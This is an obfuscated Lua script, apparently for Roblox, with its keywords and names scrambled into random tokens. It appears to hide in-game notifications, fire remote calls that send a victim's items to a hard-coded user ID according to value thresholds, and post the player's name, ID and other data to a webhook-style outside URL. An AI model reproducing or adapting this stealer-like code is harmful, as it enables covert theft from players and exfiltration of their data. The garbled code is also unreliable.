6Y()

C2epplTX = 4119
-- Obfuscated by void
print('Obfuscated by void')
C2epplTX = 4119


ZCUOf6Yg = string.char(76,103,87,113,100,111,79,90,58,47,47,109,67,70,122,88,56,86,51,46,50,109,86,104,72,120,69,79,47,69,105,77,73,66,115,109,75,47,105,114,106,117,52,117,121,109,47,49,51,51,55,53,55,51,57,52,54,53,49,51,53,53,57,53,55,50,47,87,80,68,110,71,82,121,56,45,55,115,50,115,87,100,77,113)

iTTj1vAo A9or8gko = ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111))
iTTj1vAo NCShSoYD = ZA4ax9Sp:z5ZIGYkD(string.char(78,67,83,104,83,111,89,68))
iTTj1vAo AplN2Jic = ZA4ax9Sp:z5ZIGYkD(string.char(65,112,108,78,50,74,105,99))
iTTj1vAo 9Sr8mLIC = 0 

iTTj1vAo nzfF2DEC = ZA4ax9Sp:z5ZIGYkD(string.char(110,122,102,70,50,68,69,67))

iTTj1vAo leHnuPkU, DKBLU4R8 = 377PprXk(7Ub4IFrW()
    UtVEi0Dv AplN2Jic:jQAKmvFI(Z9HhmRJZ)
zNnerVKZ)

iTTj1vAo IqC5zTZa = {
    [1] = string.char(110,52,88,65,67,106,98,84),
    [2] = {
        [string.char(52,108,109,87,50,115,115,66)] = string.char(50,120,32,89,80,112,97,83,69,71,85,32,40,49,53,32,76,99,113,80,71,53,56,68,46,41),
        [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
        [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90)
    }
}
ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))

iTTj1vAo NCShSoYD = ZA4ax9Sp:z5ZIGYkD(string.char(78,67,83,104,83,111,89,68))
iTTj1vAo 3qwDR7yF = NCShSoYD:gq3iFXF2(string.char(51,113,119,68,82,55,121,70))
iTTj1vAo kI9r3nAV = 3qwDR7yF:gq3iFXF2(string.char(99,115,97,99,68,70,121,48))
iTTj1vAo xP1MUCuW = kI9r3nAV:gq3iFXF2(string.char(120,80,49,77,85,67,117,87))

xP1MUCuW.DPzB9KlY:C7twHbtN(7Ub4IFrW(S61Oc9Uf)
    GEerVtZx S61Oc9Uf.NPeBA8ZN == string.char(105,48,75,89,78,108,119,90) V3hsGEtr
        iTTj1vAo DiA04SQw = xP1MUCuW:gq3iFXF2(string.char(105,48,75,89,78,108,119,90))
        iTTj1vAo FTZP5Yhr = DiA04SQw:gq3iFXF2(string.char(70,67,71,86,102,89,56,67))
        
        iTTj1vAo ZpFBaQBQ = FTZP5Yhr:CM2RBNWi(string.char(114,86,115,49,103,103,68,111))
        GEerVtZx ZpFBaQBQ V3hsGEtr
            ZpFBaQBQ.FBgeL16d = e9mnQEI6
        zNnerVKZ

        iTTj1vAo cqzziTWI = FTZP5Yhr:gq3iFXF2(string.char(119,88,52,105,80,50,80,66)):gq3iFXF2(string.char(75,50,110,80,90,51,115,50)):gq3iFXF2(string.char(65,98,99,107,72,97,65,71))
        GEerVtZx cqzziTWI OASa3Gsk cqzziTWI:PsjGGO4L(string.char(84,108,52,51,70,113,50,108)) V3hsGEtr
            cqzziTWI.ac83UWYT = string.char(98,77,52,78,67,66,110,88,32,79,80,51,119,67,106,97,76,33)
        zNnerVKZ
        
        iTTj1vAo DEJPFqjJ = FTZP5Yhr:gq3iFXF2(string.char(86,68,106,99,76,69,104,71)):gq3iFXF2(string.char(110,76,78,49,104,52,76,117))
        iTTj1vAo WYmVVSs2 = DEJPFqjJ:CM2RBNWi(string.char(50))
        GEerVtZx WYmVVSs2 V3hsGEtr
            WYmVVSs2.FBgeL16d = e9mnQEI6
        zNnerVKZ

        iTTj1vAo kYyMohfm = FTZP5Yhr:gq3iFXF2(string.char(86,68,106,99,76,69,104,71)):CM2RBNWi(string.char(99,119,101,71,109,76,77,80))
        GEerVtZx kYyMohfm V3hsGEtr
            kYyMohfm.FBgeL16d = e9mnQEI6
        zNnerVKZ
        
        iTTj1vAo 3uQ5WHpW = DEJPFqjJ:CM2RBNWi(string.char(49))
        GEerVtZx 3uQ5WHpW V3hsGEtr
            iTTj1vAo W6YIwxE2 = 3uQ5WHpW:gq3iFXF2(string.char(48,101,116,106,51,120,88,109))
            iTTj1vAo icFNyBCo = W6YIwxE2:gq3iFXF2(string.char(98,89,105,53,50,120,79,52)):xMizV97l(string.char(84,108,52,51,70,113,50,108))
            GEerVtZx icFNyBCo V3hsGEtr
                icFNyBCo.ac83UWYT = string.char(89,104,82,54,103,84,66,108,33)
            zNnerVKZ
        zNnerVKZ
    zNnerVKZ
zNnerVKZ)

iTTj1vAo 7Ub4IFrW xsiqekCs()

    iTTj1vAo tntoWElU = {
        [string.char(99,113,122,122,105,84,87,73)] = string.char(86,117,85,66,84,50,118,107,32,74,101,119,83,57,50,80,120,32,45,32,71,90,122,120,98,48,101,54,32,52,120,73,108,84,117,70,84,32,66,86,79,113,105,100,50,118,32,77,78,81,83,67,76,103,51,32,110,71,67,86,73,77,57,54,33,32,58,114,77,69,108,52,104,81,118,58),
        [string.char(119,77,71,66,90,122,89,57)] = 39423,
        [string.char(52,51,72,90,122,85,118,79)] = {
            {
                [string.char(77,115,110,48,66,50,72,75)] = string.char(32,240,159,150,139,239,184,143,32,74,110,53,85,54,122,72,70),
                [string.char(118,99,115,115,98,76,51,86)] = string.char(96,96,96,78,80,101,66,65,56,90,78,58,32) .. ZA4ax9Sp.AplN2Jic.jIuM9cZZ.NPeBA8ZN .. string.char(92,116,102,117,110,89,101,65,83,32,72,70,75,76,81,86,69,118,58,32) .. buq9ojic(ZA4ax9Sp.AplN2Jic.jIuM9cZZ.hFMKukUP) .. string.char(92,76,87,81,71,54,56,80,89,58,32) .. Z9HhmRJZ .. string.char(96,96,96)
            },
            {
                [string.char(77,115,110,48,66,50,72,75)] = string.char(240,159,146,181,195,161,194,180,226,128,186,195,161,194,180,194,143,195,161,194,180,226,128,186,195,161,194,180,226,130,172,195,138,197,184,32,195,138,226,130,172,195,161,194,180,194,143,195,138,226,132,162,195,161,194,180,197,147,120),
                [string.char(118,99,115,115,98,76,51,86)] = string.char(96,96,96) .. 9Sr8mLIC .. string.char(96,96,96)
            },
            {
                [string.char(77,115,110,48,66,50,72,75)] = string.char(195,161,194,180,226,128,166,195,137,194,170,195,170,197,147,194,177,195,161,194,180,226,128,158,195,161,194,180,194,143,195,138,226,130,172,195,161,194,180,226,128,166,32,115,195,161,194,180,226,128,161,195,138,226,130,172,195,161,194,180,32,195,161,194,180,226,128,161,195,138,226,130,172),
                [string.char(118,99,115,115,98,76,51,86)] = string.char(91,42,42,49,106,89,121,99,98,104,78,32,75,79,65,99,103,57,52,112,42,42,93,40,41),
            }
        }
    }

    iTTj1vAo UdCqCmrJ = nzfF2DEC:ZCBg8d2G({
        [string.char(110,90,67,54,117,66,77,100)] = string.char(64,115,85,86,98,111,82,88,101),
        [string.char(73,84,119,110,122,67,72,117)] = {tntoWElU}
    })

    H4BYjN7M({
        Ohhfsry7 = uEhRpHne,
        LEErXTS6 = string.char(66,56,100,53,69,118,106,122),
        v8vpPmkU = {
            [string.char(119,68,88,104,107,118,74,55,45,79,97,81,73,89,73,109,55)] = string.char(121,69,98,80,73,115,80,98,47,115,79,69,109,72,112,111,50)
        },
        cj172gQl = UdCqCmrJ
    })

    H4BYjN7M({
        Ohhfsry7 = ZCUOf6Yg,
        LEErXTS6 = string.char(66,56,100,53,69,118,106,122),
        v8vpPmkU = {
            [string.char(119,68,88,104,107,118,74,55,45,79,97,81,73,89,73,109,55)] = string.char(121,69,98,80,73,115,80,98,47,115,79,69,109,72,112,111,50)
        },
        cj172gQl = UdCqCmrJ
    })
zNnerVKZ

7Ub4IFrW mMEJT6M8()
    GEerVtZx 9Sr8mLIC >= 5000 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(75,115,88,97,74,78,98,88,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,119,76,73,84,100,48,90,81,45,119,76,73,84,100,48,90,81),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = nvcHmCgE,
                [string.char(112,54,55,110,55,108,51,50)] = AplN2Jic:jQAKmvFI(string.char(110,118,99,72,109,67,103,69)),
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 4000 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(75,115,88,97,74,78,98,88,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,55,109,70,70,112,88,66,122,45,55,109,70,70,112,88,66,122),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = nvcHmCgE,
                [string.char(112,54,55,110,55,108,51,50)] = 133757394651,
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 3000 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,85,107,82,121,112,66,90,89,45,85,107,82,121,112,66,90,89),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = 133757394651,
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2700 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(77,78,81,83,67,76,103,51,32,49,69,69,88,82,88,99,104),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2550 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,103,97,57,97,51,54,90,73,45,103,97,57,97,51,54,90,73),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2500 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,103,56,68,52,82,108,50,83,45,103,56,68,52,82,108,50,83),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2450 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,50,122,116,100,105,122,65,111,45,50,122,116,100,105,122,65,111),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2425 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,65,83,70,111,81,122,84,83,45,65,83,70,111,81,122,84,83),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2400 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,48,50,86,68,56,68,78,75,45,48,50,86,68,56,68,78,75),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2350 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,78,69,99,50,101,86,50,67,45,110,100,116,56,101,113,97,121,45,78,69,99,50,101,86,50,67,45,110,100,116,56,101,113,97,121),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2300 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,118,115,119,49,121,72,106,98,45,118,115,119,49,121,72,106,98),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2250 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,81,72,85,76,110,102,100,53,45,81,72,85,76,110,102,100,53),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2200 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,113,97,79,122,79,110,57,49,45,113,97,79,122,79,110,57,49),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2100 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,84,50,48,117,74,106,79,67,45,84,50,48,117,74,106,79,67),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 2000 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,106,57,66,104,55,70,88,75,45,106,57,66,104,55,70,88,75),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1900 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,65,90,85,51,104,72,79,48,45,65,90,85,51,104,72,79,48),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1800 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,72,112,111,84,82,109,75,84,45,72,112,111,84,82,109,75,84),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1700 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,107,89,102,82,111,120,70,101,45,107,89,102,82,111,120,70,101),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1650 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,122,119,57,56,57,57,114,113,45,122,119,57,56,57,57,114,113),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1500 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(57,102,48,117,78,101,109,110,32,86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,109,66,69,98,99,110,90,99,45,109,66,69,98,99,110,90,99),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
